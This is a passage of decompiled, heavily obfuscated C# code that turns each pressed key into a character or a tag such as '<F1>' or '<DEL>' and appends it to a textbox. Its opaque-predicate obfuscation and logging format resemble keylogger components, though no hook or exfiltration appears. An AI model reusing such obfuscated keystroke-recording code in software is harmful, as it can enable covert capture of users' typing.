                      if ((uint) flag1 <= uint.MaxValue)
                        goto label_934;
                      else
                        goto label_961;
                    }
                    else
                      goto label_949;
                  }
                }
                this.TextBox1.Text += "<F2>";
                return;
              }
              goto label_941;
            }
            else
              goto label_99;
          }
          else
            goto label_944;
        }
        else
          goto label_947;
      }
      else if ((uint) flag11 + (uint) flag11 < 0U)
        goto label_1822;
      else
        goto label_959;
label_953:
      if (!flag2)
      {
        if (((flag2 ? 1 : 0) & 0) == 0)
        {
          if ((uint) flag1 >= 0U)
            goto label_952;
          else
            goto label_959;
        }
        else
          goto label_956;
      }
label_955:
      this.TextBox1.Text += ">";
      if (true)
        return;
label_956:
      if (!flag2)
      {
        flag2 = Key == Keys.OemPeriod;
        goto label_953;
      }
      else
        goto label_961;
label_959:
      if ((uint) flag1 > uint.MaxValue)
        return;
      goto label_949;
label_961:
      this.TextBox1.Text += ":";
      return;
label_966:
      if (((flag1 ? 1 : 0) & 0) != 0)
        goto label_969;
label_967:
      if (Key != Keys.OemPipe)
      {
        flag2 = Key == Keys.OemSemicolon;
        if ((uint) flag1 < 0U)
          return;
        if ((uint) flag1 > uint.MaxValue)
        {
          if (((flag1 ? 1 : 0) & 0) != 0)
            return;
          goto label_961;
        }
        else
          goto label_956;
      }
      else
      {
        this.TextBox1.Text += "|";
        if (true)
          ;
        return;
      }
label_969:
      if ((uint) flag2 + (uint) flag1 >= 0U)
        goto label_967;
label_970:
      if (!flag2)
      {
        if ((uint) flag2 > uint.MaxValue && (uint) flag2 >= 0U)
        {
          if ((uint) flag2 < 0U)
            goto label_834;
          else
            goto label_969;
        }
        else
          goto label_966;
      }
label_972:
      this.TextBox1.Text += "?";
      if (true)
        return;
      goto label_438;
label_973:
      flag2 = Key == Keys.OemQuestion;
      goto label_970;
label_974:
      if ((uint) flag2 > uint.MaxValue || flag2)
      {
        this.TextBox1.Text += "}";
        return;
      }
      goto label_973;
label_976:
      flag2 = Key == Keys.OemCloseBrackets;
      goto label_974;
label_979:
      if (!flag2)
        goto label_976;
label_980:
      this.TextBox1.Text += "{";
      if (true)
        return;
      goto label_1084;
label_982:
      if ((uint) flag1 + (uint) flag2 >= 0U)
        goto label_979;
      else
        goto label_980;
label_985:
      if (!flag2)
      {
        if ((uint) flag2 < 0U)
          goto label_424;
      }
      else
      {
        this.TextBox1.Text += "<";
        goto label_988;
      }
label_987:
      flag2 = Key == Keys.OemMinus;
      if ((uint) flag1 >= 0U)
      {
        if ((uint) flag2 <= uint.MaxValue)
        {
          if (!flag2)
          {
            flag2 = Key == Keys.OemOpenBrackets;
            goto label_982;
          }
          else
          {
            this.TextBox1.Text += "_";
            return;
          }
        }
        else
          goto label_973;
      }
label_988:
      if ((uint) flag1 - (uint) flag1 >= 0U)
        return;
      if ((uint) flag1 < 0U)
        goto label_1278;
      else
        goto label_1034;
label_992:
      flag2 = Key == Keys.Oemcomma;
      if (true)
        goto label_985;
label_993:
      this.TextBox1.Text += "Z";
      if ((uint) flag1 - (uint) flag2 >= 0U)
        return;
      goto label_628;
label_994:
      flag2 = Key == Keys.Z;
      if ((uint) flag1 <= uint.MaxValue)
      {
        if (flag2)
          goto label_993;
        else
          goto label_992;
      }
      else
        goto label_1374;
label_995:
      if (flag2)
      {
        this.TextBox1.Text += "Y";
        if (((flag2 ? 1 : 0) & 0) == 0)
        {
          if (((flag1 ? 1 : 0) | int.MaxValue) != 0)
            return;
          goto label_1021;
        }
        else
          goto label_1359;
      }
      else
        goto label_994;
label_997:
      flag2 = Key == Keys.Y;
      if (true)
        goto label_995;
label_1001:
      if (flag2)
      {
        this.TextBox1.Text += "W";
        return;
      }
label_1002:
      bool flag12 = Key == Keys.X;
      if (((flag1 ? 1 : 0) & 0) != 0)
        return;
      if (true)
      {
        if (flag12)
        {
          this.TextBox1.Text += "X";
          return;
        }
        goto label_997;
      }
      else
        goto label_1365;
label_1003:
      if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
        goto label_472;
      else
        goto label_1002;
label_1016:
      flag2 = Key == Keys.S;
label_1017:
      if (!flag2)
      {
        if (Key != Keys.T)
        {
          if (Key != Keys.U)
          {
            bool flag13 = Key == Keys.V;
            if (false)
              return;
            if ((uint) flag13 - (uint) flag1 >= 0U)
            {
              if (!flag13)
              {
                flag2 = Key == Keys.W;
                if ((uint) flag1 + (uint) flag1 >= 0U)
                {
                  if (((flag1 ? 1 : 0) | 3) == 0)
                    goto label_224;
                  else
                    goto label_1001;
                }
                else
                  goto label_2026;
              }
              else
              {
                this.TextBox1.Text += "V";
                return;
              }
            }
            else
              goto label_844;
          }
          else
          {
            this.TextBox1.Text += "U";
            return;
          }
        }
        else
        {
          this.TextBox1.Text += "T";
          return;
        }
      }
      else
      {
        this.TextBox1.Text += "S";
        return;
      }
label_1020:
      if (!flag2)
        goto label_1016;
label_1021:
      this.TextBox1.Text += "R";
      return;
label_1027:
      this.TextBox1.Text += "P";
      return;
label_1028:
      if (Key != Keys.P)
      {
        bool flag14 = Key == Keys.Q;
        if ((uint) flag1 + (uint) flag14 <= uint.MaxValue)
        {
          if (!flag14)
          {
            flag2 = Key == Keys.R;
            goto label_1020;
          }
          else
          {
            this.TextBox1.Text += "Q";
            return;
          }
        }
        else
          goto label_1021;
      }
      else
        goto label_1027;
label_1029:
      if (!flag2)
      {
        if ((uint) flag1 <= uint.MaxValue)
          goto label_1028;
        else
          goto label_1045;
      }
label_1032:
      this.TextBox1.Text += "O";
      return;
label_1034:
      if ((uint) flag2 > uint.MaxValue)
        goto label_1036;
label_1035:
      flag2 = Key == Keys.O;
      if (true)
      {
        if (false)
        {
          if (((flag1 ? 1 : 0) | int.MaxValue) == 0)
            goto label_1863;
          else
            goto label_1032;
        }
        else
          goto label_1029;
      }
      else
        goto label_1034;
label_1036:
      if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
        goto label_1035;
label_1037:
      if (!flag2)
      {
        if (((flag1 ? 1 : 0) & 0) != 0)
        {
          if ((uint) flag1 - (uint) flag2 >= 0U)
            ;
          return;
        }
        goto label_1034;
      }
      else
      {
        this.TextBox1.Text += "N";
        return;
      }
label_1045:
      if (Key != Keys.M)
      {
        flag2 = Key == Keys.N;
        goto label_1037;
      }
      else if (true)
      {
        this.TextBox1.Text += "M";
        if (true)
          return;
        goto label_1028;
      }
      else
        goto label_1528;
label_1048:
      this.TextBox1.Text += "L";
      return;
label_1054:
      if (!flag2)
      {
        bool flag15 = Key == Keys.K;
        if (!flag15)
        {
          flag2 = Key == Keys.L;
          if (!flag2)
          {
            if ((uint) flag2 + (uint) flag2 >= 0U)
            {
              if ((uint) flag1 >= 0U)
                goto label_1045;
              else
                goto label_1048;
            }
            else if (false)
              goto label_150;
            else
              goto label_1553;
          }
          else
            goto label_1048;
        }
        else
        {
          if (((flag15 ? 1 : 0) & 0) != 0)
            return;
          this.TextBox1.Text += "K";
          return;
        }
      }
      else
      {
        this.TextBox1.Text += "J";
        if (true)
        {
          if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
          {
            if ((uint) flag2 >= 0U)
              return;
            goto label_1068;
          }
        }
        else
          goto label_1060;
      }
label_1058:
      flag2 = Key == Keys.J;
      if ((uint) flag1 + (uint) flag2 > uint.MaxValue)
        goto label_597;
      else
        goto label_1054;
label_1060:
      if (!flag2)
      {
        if (false)
          goto label_1032;
        else
          goto label_1058;
      }
      else
      {
        this.TextBox1.Text += string.Intern(x1110bdd110cdcea4._xaacba899487bce8c("mele", 1338657539));
        return;
      }
label_1068:
      if (!flag2)
      {
        if (Key != Keys.H)
        {
          flag2 = Key == Keys.I;
          goto label_1060;
        }
        else
        {
          if (false)
            return;
          this.TextBox1.Text += "H";
          return;
        }
      }
label_1069:
      this.TextBox1.Text += "G";
      if ((uint) flag1 <= uint.MaxValue)
        return;
      goto label_822;
label_1070:
      if (!flag2)
      {
        flag2 = Key == Keys.G;
        if ((uint) flag2 - (uint) flag1 < 0U)
        {
          if ((uint) flag1 + (uint) flag2 < 0U)
            return;
          goto label_1087;
        }
        else
          goto label_1068;
      }
label_1072:
      this.TextBox1.Text += "F";
      return;
label_1077:
      flag2 = Key == Keys.F;
      if ((uint) flag2 < 0U)
        return;
      goto label_1070;
label_1078:
      if (!flag2)
      {
        if (true)
        {
          if (((flag1 ? 1 : 0) & 0) != 0)
            goto label_1221;
          else
            goto label_1077;
        }
        else if ((uint) flag1 <= uint.MaxValue)
        {
          if (true)
          {
            if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
            {
              if ((uint) flag2 < 0U)
                return;
              goto label_1070;
            }
            else
              goto label_1072;
          }
          else
            goto label_564;
        }
        else
          goto label_1070;
      }
      else
      {
        this.TextBox1.Text += "E";
        goto label_1086;
      }
label_1084:
      flag2 = Key == Keys.D;
      if (!flag2)
      {
        flag2 = Key == Keys.E;
        goto label_1078;
      }
      else
      {
        this.TextBox1.Text += "D";
        if ((uint) flag1 - (uint) flag2 >= 0U)
          return;
      }
label_1086:
      if (true)
        return;
label_1087:
      if (((flag1 ? 1 : 0) & 0) == 0)
      {
        if ((uint) flag1 < 0U)
          goto label_235;
        else
          goto label_1054;
      }
      else if ((uint) flag1 >= 0U)
        goto label_972;
      else
        goto label_872;
label_1093:
      if (!flag2)
      {
        flag2 = Key == Keys.C;
        if (flag2)
        {
          this.TextBox1.Text += "C";
          if (true)
          {
            if ((uint) flag1 <= uint.MaxValue)
              return;
            goto label_1151;
          }
        }
        else
          goto label_1084;
      }
      else
        goto label_1094;
label_1091:
      this.TextBox1.Text += "B";
      if ((uint) flag1 + (uint) flag1 >= 0U)
        return;
      goto label_966;
label_1094:
      if (((flag1 ? 1 : 0) & 0) != 0)
        goto label_560;
      else
        goto label_1091;
label_1106:
      flag2 = Key == Keys.D8;
      if ((uint) flag1 + (uint) flag2 > uint.MaxValue || flag2)
        goto label_1105;
      else
        goto label_1104;
label_1103:
      this.TextBox1.Text += "(";
      return;
label_1104:
      bool flag16 = Key == Keys.D9;
      if ((uint) flag1 <= uint.MaxValue && !flag16)
      {
        flag2 = Key == Keys.D0;
        if (!flag2)
        {
          flag2 = Key == Keys.A;
          if ((uint) flag1 + (uint) flag2 >= 0U)
          {
            if (!flag2)
            {
              flag2 = Key == Keys.B;
              goto label_1093;
            }
            else
            {
              if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
              {
                this.TextBox1.Text += "A";
                return;
              }
              goto label_85;
            }
          }
          else
            goto label_18;
        }
        else if ((uint) flag1 <= uint.MaxValue)
        {
          if ((uint) flag1 + (uint) flag1 >= 0U)
          {
            this.TextBox1.Text += ")";
            return;
          }
          goto label_1344;
        }
        else
          goto label_1454;
      }
      else
        goto label_1103;
label_1105:
      this.TextBox1.Text += "*";
      if ((uint) flag2 + (uint) flag1 >= 0U)
      {
        if (((flag2 ? 1 : 0) | 1) != 0)
          return;
        goto label_1103;
      }
      else
        goto label_41;
label_1107:
      if (((flag1 ? 1 : 0) | int.MinValue) == 0 || flag2)
      {
        this.TextBox1.Text += "&";
        return;
      }
      goto label_1106;
label_1109:
      flag2 = Key == Keys.D7;
      if (((flag1 ? 1 : 0) | 2) != 0)
        goto label_1107;
      else
        goto label_1106;
label_1113:
      bool flag17 = Key == Keys.D6;
      if ((uint) flag1 + (uint) flag1 >= 0U)
      {
        if ((uint) flag1 + (uint) flag17 >= 0U)
        {
          if (flag17)
          {
            this.TextBox1.Text += "^";
            return;
          }
          goto label_1109;
        }
      }
      else
        goto label_497;
label_1119:
      do
      {
        flag2 = Key == Keys.D5;
        if (flag2)
        {
          if ((uint) flag2 <= uint.MaxValue)
          {
            this.TextBox1.Text += "%";
            if (false)
              goto label_1359;
          }
          else
            break;
        }
        else
          goto label_1113;
      }
      while ((uint) flag1 - (uint) flag2 < 0U);
      if (true)
      {
        if (false)
          ;
        return;
      }
      goto label_1585;
label_1121:
      if (flag2)
      {
        this.TextBox1.Text += "$";
        if (((flag2 ? 1 : 0) | -1) != 0)
        {
          if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
            return;
          if (false)
            goto label_1382;
          else
            goto label_1119;
        }
      }
      else
        goto label_1119;
label_1124:
      if (!flag2)
      {
        flag2 = Key == Keys.D4;
        goto label_1121;
      }
      else
        goto label_1128;
label_1127:
      if (true)
        return;
      goto label_1130;
label_1128:
      this.TextBox1.Text += "#";
      goto label_1127;
label_1130:
      flag2 = Key == Keys.D3;
      if ((uint) flag2 + (uint) flag1 < 0U)
      {
        if ((uint) flag1 - (uint) flag2 >= 0U)
          goto label_1128;
        else
          goto label_1127;
      }
      else
        goto label_1124;
label_1133:
      do
      {
        while (flag2)
        {
          this.TextBox1.Text += "@";
          if (((flag1 ? 1 : 0) & 0) == 0)
            return;
          if (((flag1 ? 1 : 0) | (int) byte.MaxValue) != 0)
          {
            if ((uint) flag1 > uint.MaxValue)
              goto label_1150;
          }
          else
            goto label_822;
        }
        if (((flag2 ? 1 : 0) | 15) == 0)
          goto label_340;
      }
      while (false && (uint) flag2 - (uint) flag2 < 0U);
      goto label_1130;
label_1135:
      flag2 = Key == Keys.D2;
      goto label_1133;
label_1150:
      bool flag18 = Key == Keys.Add;
      if (!flag18)
      {
        if (((flag18 ? 1 : 0) | 8) != 0)
        {
          if (true)
          {
            if (Key != Keys.Multiply)
              return;
            this.TextBox1.Text += "*";
            return;
          }
          goto label_1400;
        }
        else
          goto label_1989;
      }
      else
      {
        this.TextBox1.Text += "+";
        return;
      }
label_1151:
      if (((flag1 ? 1 : 0) & 0) != 0 || flag2)
      {
        this.TextBox1.Text += "-";
        return;
      }
      if ((uint) flag2 <= uint.MaxValue)
        goto label_1150;
      else
        goto label_1133;
label_1154:
      if (flag2)
        goto label_1156;
label_1155:
      flag2 = Key == Keys.Subtract;
      goto label_1171;
label_1156:
      this.TextBox1.Text += ".";
      if (true)
        return;
      if (true)
        goto label_1154;
      else
        goto label_1171;
label_1159:
      if (!flag2)
      {
        flag2 = Key == Keys.Decimal;
        if ((uint) flag1 > uint.MaxValue)
        {
          if ((uint) flag1 >= 0U)
          {
            if ((uint) flag2 >= 0U)
            {
              if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
                goto label_128;
              else
                goto label_131;
            }
            else if (true)
              goto label_1304;
            else
              goto label_1308;
          }
          else
            goto label_864;
        }
        else
          goto label_1154;
      }
      else
      {
        this.TextBox1.Text += "/";
        goto label_1164;
      }
label_1163:
      flag2 = Key == Keys.Divide;
      if ((uint) flag2 >= 0U)
        goto label_1159;
label_1164:
      if (((flag2 ? 1 : 0) & 0) == 0)
      {
        if (true)
          return;
        goto label_414;
      }
      else
        goto label_1156;
label_1167:
      if (!flag2)
      {
        flag2 = Key == Keys.Escape;
        if (!flag2)
        {
          if ((uint) flag2 + (uint) flag2 < 0U)
            goto label_251;
          else
            goto label_1163;
        }
        else
        {
          this.TextBox1.Text += "<ESC>";
          if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
            return;
          goto label_1163;
        }
      }
      else
      {
        this.TextBox1.Text += "<END>";
        return;
      }
label_1169:
      flag2 = Key == Keys.End;
      if (((flag1 ? 1 : 0) | 3) == 0)
      {
        if (true)
        {
          if (true)
            goto label_1048;
          else
            goto label_1045;
        }
        else
          goto label_1311;
      }
      else
        goto label_1167;
label_1170:
      if ((uint) flag1 + (uint) flag2 > uint.MaxValue)
        goto label_1175;
      else
        goto label_1169;
label_1171:
      if (false)
        return;
      goto label_1151;
label_1175:
      if (!flag2)
      {
        if (false)
          goto label_1606;
        else
          goto label_1169;
      }
      else
      {
        this.TextBox1.Text += "<TAB>";
        return;
      }
label_1187:
      this.TextBox1.Text += "?";
      return;
label_1191:
      flag2 = Key == Keys.Up;
      if (!flag2)
      {
        if ((uint) flag1 >= 0U)
          flag2 = Key == Keys.Left;
        if (((flag2 ? 1 : 0) | -2) == 0)
          return;
        while (!flag2)
        {
          if (true)
            goto label_1180;
          else
            goto label_1185;
label_1177:
          flag2 = Key == Keys.Tab;
          if ((uint) flag1 < 0U)
            goto label_769;
          else
            goto label_1175;
label_1180:
          if (Key == Keys.Right)
          {
            this.TextBox1.Text += "?";
            return;
          }
          goto label_1177;
label_1185:
          if (((flag1 ? 1 : 0) & 0) == 0)
          {
            if (((flag1 ? 1 : 0) & 0) != 0 || (uint) flag1 + (uint) flag2 < 0U)
              return;
            if ((uint) flag1 + (uint) flag2 < 0U)
            {
              if ((uint) flag2 - (uint) flag1 >= 0U)
                goto label_1215;
              else
                goto label_1212;
            }
            else if ((uint) flag1 - (uint) flag1 >= 0U)
              goto label_1177;
            else
              goto label_1243;
          }
        }
        this.TextBox1.Text += "?";
        if (true)
        {
          if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
            return;
          goto label_1815;
        }
        else
          goto label_817;
      }
      else
        goto label_1187;
label_1212:
      while (!flag2)
      {
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
          goto label_1211;
label_1207:
        while (Key != Keys.Delete)
        {
          flag2 = Key == Keys.Back;
          if (!flag2)
            goto label_1196;
          else
            goto label_1203;
label_1192:
          if (!flag2)
          {
            if (false)
              goto label_1404;
            else
              goto label_1191;
          }
          else
          {
            this.TextBox1.Text += "?";
            if (true)
              return;
            goto label_1212;
          }
label_1196:
          flag2 = Key == Keys.Down;
          if ((uint) flag1 <= uint.MaxValue)
          {
            if ((uint) flag1 + (uint) flag1 >= 0U)
              goto label_1192;
          }
          else
            goto label_2065;
label_1199:
          if ((uint) flag1 + (uint) flag2 >= 0U)
          {
            if (true)
            {
              this.TextBox1.Text += "<DEL>";
              return;
            }
            goto label_1192;
          }
          else if ((uint) flag2 - (uint) flag1 >= 0U)
          {
            if ((uint) flag1 + (uint) flag1 >= 0U)
            {
              if (false)
                goto label_4;
              else
                goto label_1304;
            }
            else
              goto label_1301;
          }
          else
            goto label_1214;
label_1203:
          if ((uint) flag1 - (uint) flag2 < 0U)
            return;
          if (true)
          {
            if ((uint) flag1 <= uint.MaxValue)
            {
              if ((uint) flag2 <= uint.MaxValue)
              {
                if (false)
                  goto label_128;
                else
                  goto label_1199;
              }
              else if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
                goto label_1212;
              else
                goto label_1211;
            }
          }
          else
            break;
        }
        this.TextBox1.Text += "<DEL>";
        return;
label_1211:
        flag2 = Key == Keys.F12;
        if (flag2)
        {
          this.TextBox1.Text += "<F12>";
          if (true)
            return;
          goto label_114;
        }
        else
          goto label_1207;
      }
label_1214:
      this.TextBox1.Text += "<F11>";
      return;
label_1215:
      if ((uint) flag1 > uint.MaxValue)
        goto label_1036;
label_1216:
      if (!flag2)
      {
        flag2 = Key == Keys.F11;
        if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
          goto label_1170;
        else
          goto label_1212;
      }
label_1219:
      this.TextBox1.Text += "<F10>";
      return;
label_1221:
      flag2 = Key == Keys.F10;
      if (true)
        goto label_1216;
      else
        goto label_1219;
label_1230:
      flag2 = Key == Keys.F8;
      if (!flag2)
      {
        flag2 = Key == Keys.F9;
        if ((uint) flag2 + (uint) flag2 >= 0U)
          goto label_1222;
        else
          goto label_1228;
label_1220:
        if (((flag1 ? 1 : 0) & 0) != 0)
          goto label_128;
        else
          goto label_1221;
label_1222:
        if (!flag2)
          goto label_1220;
label_1223:
        this.TextBox1.Text += "<F9>";
        return;
label_1228:
        if (true)
        {
          if (true)
          {
            if ((uint) flag1 < 0U)
            {
              if (true)
                goto label_1222;
              else
                goto label_1220;
            }
            else
              goto label_1223;
          }
          else
            goto label_626;
        }
        else
          goto label_89;
      }
      else
      {
        this.TextBox1.Text += "<F8>";
        if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
          return;
        goto label_297;
      }
label_1235:
      flag2 = Key == Keys.F7;
      if ((uint) flag1 - (uint) flag2 >= 0U)
      {
        while (flag2)
        {
          this.TextBox1.Text += "<F7>";
          if (((flag2 ? 1 : 0) | 4) != 0)
          {
            if (true)
              return;
          }
          else
            goto label_2024;
        }
        goto label_1230;
      }
      else
        goto label_1215;
label_1239:
      if (!flag2)
      {
        if ((uint) flag1 + (uint) flag1 >= 0U)
        {
          if ((uint) flag2 <= uint.MaxValue)
          {
            if ((uint) flag2 - (uint) flag1 >= 0U)
            {
              if ((uint) flag1 >= 0U)
              {
                if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
                  goto label_572;
                else
                  goto label_1235;
              }
              else
                goto label_1647;
            }
            else
              goto label_1215;
          }
          else
            goto label_1243;
        }
        else
          goto label_1955;
      }
label_1241:
      this.TextBox1.Text += "<F6>";
      if ((uint) flag1 - (uint) flag1 < 0U)
        ;
      return;
label_1243:
      flag2 = Key == Keys.F6;
      if (((flag2 ? 1 : 0) | 1) != 0)
        goto label_1239;
      else
        goto label_1241;
label_1246:
      this.TextBox1.Text += "<F5>";
      return;
label_1253:
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
        return;
      goto label_1283;
label_1257:
      this.TextBox1.Text += "<F3>";
      goto label_1253;
label_1262:
      while (!flag2)
      {
        if (false)
          return;
        flag2 = Key == Keys.F2;
        if (!flag2)
        {
          flag2 = Key == Keys.F3;
          if (!flag2)
          {
            if (true)
            {
              if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
              {
                if (((flag1 ? 1 : 0) & 0) == 0)
                  flag2 = Key == Keys.F4;
                else
                  goto label_1990;
              }
              if ((uint) flag1 - (uint) flag1 >= 0U)
              {
                if (!flag2)
                {
                  bool flag19 = Key == Keys.F5;
                  if ((uint) flag19 < 0U)
                    return;
                  if (!flag19)
                    goto label_1243;
                  else
                    goto label_1246;
                }
                else
                {
                  this.TextBox1.Text += "<F4>";
                  return;
                }
              }
            }
            else
              goto label_1253;
          }
          else
            goto label_1257;
        }
        else
          goto label_1261;
label_1258:
        this.TextBox1.Text += "<F2>";
        if ((uint) flag1 + (uint) flag2 >= 0U)
          return;
        goto label_1253;
label_1261:
        if (true)
          goto label_1258;
      }
      this.TextBox1.Text += "<F1>";
      if (((flag1 ? 1 : 0) | 15) == 0)
        ;
      return;
label_1264:
      flag2 = Key == Keys.F1;
      goto label_1262;
label_1265:
      if (flag2)
      {
        this.TextBox1.Text += "\r\n";
        return;
      }
      if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
        goto label_1264;
      else
        goto label_1262;
label_1268:
      flag2 = Key == Keys.Return;
      goto label_1265;
label_1275:
      if (!flag2)
      {
        flag2 = Key == Keys.Oemtilde;
        if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
        {
          if (!flag2)
          {
            if (Key == Keys.Space)
            {
              this.TextBox1.Text += " ";
              return;
            }
            goto label_1268;
          }
        }
        else if (((flag2 ? 1 : 0) & 0) != 0)
          goto label_1003;
        this.TextBox1.Text += "`";
        return;
      }
      this.TextBox1.Text += ".";
      return;
label_1278:
      if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
        goto label_42;
      else
        goto label_1275;
label_1280:
      this.TextBox1.Text += ";";
      if ((uint) flag1 + (uint) flag2 >= 0U)
      {
        if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
          return;
        goto label_63;
      }
      else
        goto label_1027;
label_1283:
      if (!flag2)
      {
        flag2 = Key == Keys.OemPeriod;
        goto label_1278;
      }
      else if ((uint) flag2 >= 0U)
        goto label_1280;
label_1285:
      if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
        goto label_1970;
label_1286:
      if (flag2)
        goto label_1291;
label_1287:
      flag2 = Key == Keys.OemSemicolon;
      if (true)
      {
        if (true)
        {
          if (((flag1 ? 1 : 0) | 3) == 0)
            return;
          goto label_1283;
        }
        else
          goto label_2151;
      }
      else
        goto label_1280;
label_1291:
      this.TextBox1.Text += "\\";
      if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
        return;
      if ((uint) flag1 <= uint.MaxValue)
      {
        if (false)
          goto label_987;
      }
      else
        goto label_1295;
label_1294:
      flag2 = Key == Keys.OemPipe;
      if (false)
      {
        if (false)
          goto label_1119;
        else
          goto label_1291;
      }
      else
        goto label_1286;
label_1295:
      if (flag2)
      {
        this.TextBox1.Text += "/";
        if ((uint) flag2 + (uint) flag1 > uint.MaxValue || true)
          return;
        goto label_4;
      }
      else
        goto label_1294;
label_1301:
      bool flag20 = Key == Keys.OemOpenBrackets;
      while (!flag20)
      {
        flag20 = Key == Keys.OemCloseBrackets;
        if (!flag20)
        {
          flag2 = Key == Keys.OemQuestion;
          goto label_1295;
        }
        else
        {
          this.TextBox1.Text += "]";
          if (true)
            return;
        }
      }
      this.TextBox1.Text += "[";
      return;
label_1304:
      if ((uint) flag2 - (uint) flag1 >= 0U)
      {
        if (false)
          return;
        goto label_1301;
      }
label_1308:
      if (flag2)
      {
        this.TextBox1.Text += "'";
        if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
          return;
        goto label_444;
      }
      else
        goto label_1301;
label_1311:
      flag2 = Key == Keys.OemQuotes;
      if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
        return;
      goto label_1308;
label_1312:
      if (flag2)
      {
        this.TextBox1.Text += "-";
        if (true)
          return;
        goto label_56;
      }
      else
        goto label_1311;
label_1317:
      if (!flag2)
      {
        if (Key != Keys.Oemcomma)
        {
          flag2 = Key == Keys.OemMinus;
          goto label_1312;
        }
        else
        {
          this.TextBox1.Text += ",";
          return;
        }
      }
label_1319:
      this.TextBox1.Text += "9";
      return;
label_1326:
      flag2 = Key == Keys.NumPad7;
      if (!flag2)
      {
        while (true)
        {
          flag2 = Key == Keys.NumPad8;
          if (!flag2)
          {
            if (((flag1 ? 1 : 0) | (int) byte.MaxValue) != 0)
            {
              flag2 = Key == Keys.NumPad9;
              if (true)
                break;
              goto label_1319;
            }
          }
          else
          {
            this.TextBox1.Text += "8";
            return;
          }
        }
        goto label_1317;
      }
      else
      {
        this.TextBox1.Text += "7";
        if (true)
          goto label_1348;
      }
label_1340:
      bool flag21 = Key == Keys.NumPad4;
      if (true)
      {
        if (!flag21)
        {
          flag2 = Key == Keys.NumPad5;
          while (!flag2)
          {
            if (true)
            {
              flag2 = Key == Keys.NumPad6;
              if (flag2)
              {
                if (true)
                {
                  if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
                    return;
                  if ((uint) flag1 - (uint) flag2 >= 0U)
                  {
                    this.TextBox1.Text += "6";
                    if (((flag1 ? 1 : 0) | int.MinValue) != 0)
                      return;
                    goto label_771;
                  }
                  else
                    goto label_997;
                }
              }
              else
                goto label_1326;
            }
            else
              goto label_1620;
          }
          this.TextBox1.Text += "5";
          if (false)
            return;
          if ((uint) flag2 + (uint) flag2 < 0U)
          {
            if ((uint) flag1 - (uint) flag1 >= 0U)
            {
              if ((uint) flag1 - (uint) flag2 < 0U)
                return;
              if (true)
              {
                if (false)
                  return;
                if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
                {
                  if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
                  {
                    if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
                    {
                      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
                        goto label_646;
label_645:
                      if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
                        goto label_1807;
                      else
                        goto label_643;
label_646:
                      if ((uint) flag1 < 0U)
                      {
                        if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
                          return;
                        if (false)
                        {
                          if ((uint) flag2 + (uint) flag2 < 0U)
                            goto label_1673;
                          else
                            goto label_1672;
                        }
                        else
                          goto label_645;
                      }
                      else
                        goto label_628;
                    }
                    else
                      goto label_628;
                  }
                  else
                    goto label_1017;
                }
                else
                  goto label_624;
              }
              else
                goto label_165;
            }
            else
              goto label_1786;
          }
          else
          {
            if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
              return;
            goto label_1404;
          }
        }
      }
      else
        goto label_1341;
label_1339:
      this.TextBox1.Text += "4";
      return;
label_1341:
      if (true)
        goto label_1339;
      else
        goto label_1348;
label_1344:
      if (!flag2)
      {
        bool flag22 = Key == Keys.NumPad3;
        while (flag22)
        {
          this.TextBox1.Text += "3";
          if (true)
            return;
        }
        goto label_1340;
      }
      else
      {
        this.TextBox1.Text += "2";
        return;
      }
label_1348:
      if ((uint) flag1 >= 0U)
        return;
      goto label_1374;
label_1349:
      flag2 = Key == Keys.NumPad2;
      if (true)
      {
        if ((uint) flag2 - (uint) flag2 < 0U)
          goto label_1466;
        else
          goto label_1344;
      }
      else
        goto label_1815;
label_1359:
      flag2 = Key == Keys.NumPad0;
      if (true)
      {
        if (!flag2)
        {
          flag2 = Key == Keys.NumPad1;
          if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
          {
            if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
              return;
            if (true)
            {
              if (flag2)
              {
                this.TextBox1.Text += "1";
                return;
              }
              goto label_1349;
            }
            else
              goto label_571;
          }
          else
            goto label_2070;
        }
        else
        {
          this.TextBox1.Text += "0";
          if (true)
            return;
          goto label_431;
        }
      }
      else if (((flag1 ? 1 : 0) & 0) != 0)
        goto label_1432;
label_1361:
      if (!flag2)
      {
        if ((uint) flag2 - (uint) flag2 < 0U)
          return;
        if (((flag2 ? 1 : 0) | 3) == 0)
          goto label_1546;
        else
          goto label_1359;
      }
      else
      {
        this.TextBox1.Text += "9";
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
          return;
        goto label_1359;
      }
label_1365:
      while (Key == Keys.D8)
      {
        if (true)
        {
          this.TextBox1.Text += "8";
          if (false)
            ;
          return;
        }
      }
      flag2 = Key == Keys.D9;
      goto label_1361;
label_1367:
      if ((uint) flag2 + (uint) flag2 > uint.MaxValue || flag2)
      {
        this.TextBox1.Text += "7";
        return;
      }
      goto label_1365;
label_1371:
      if (flag2)
        goto label_1374;
label_1372:
